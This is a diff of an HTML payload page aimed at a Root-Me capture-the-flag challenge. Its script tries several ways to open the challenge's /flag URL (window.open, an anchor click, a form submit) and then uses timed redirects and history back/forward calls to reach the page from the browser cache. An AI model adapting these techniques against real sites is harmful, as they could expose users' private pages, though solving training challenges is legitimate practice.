@@ -1,10 +1,34 @@
 <!doctype html>
+<html>
+<body>
 <script>
-const TARGET = "http://challenge01.root-me.org:58007/flag";
+const T = "http://challenge01.root-me.org:58007/flag";
 
-const w = window.open(TARGET, "_blank");
-setTimeout(() => { try { w && w.close(); } catch(e){} }, 250);
+// try 1: window.open
+try { window.open(T, "_blank", "noopener,noreferrer"); } catch(e) {}
 
-setTimeout(() => { location.href = TARGET; }, 450);
-setTimeout(() => { location.href = TARGET; }, 900);
+// try 2: anchor click
+const a = document.createElement("a");
+a.href = T;
+a.target = "_blank";
+a.rel = "noopener noreferrer";
+document.body.appendChild(a);
+a.click();
+
+// try 3: form target blank
+const f = document.createElement("form");
+f.method = "GET";
+f.action = T;
+f.target = "_blank";
+document.body.appendChild(f);
+f.submit();
+
+// now force main tab through history/cache path
+setTimeout(() => { location.href = T; }, 300);
+setTimeout(() => { location.href = "http://challenge01.root-me.org:58007/"; }, 800);
+setTimeout(() => { history.back(); }, 1300);   // back to /flag from history/bfcache
+setTimeout(() => { history.forward(); }, 1700);
+setTimeout(() => { history.back(); }, 2100);
 </script>
+</body>
+</html>
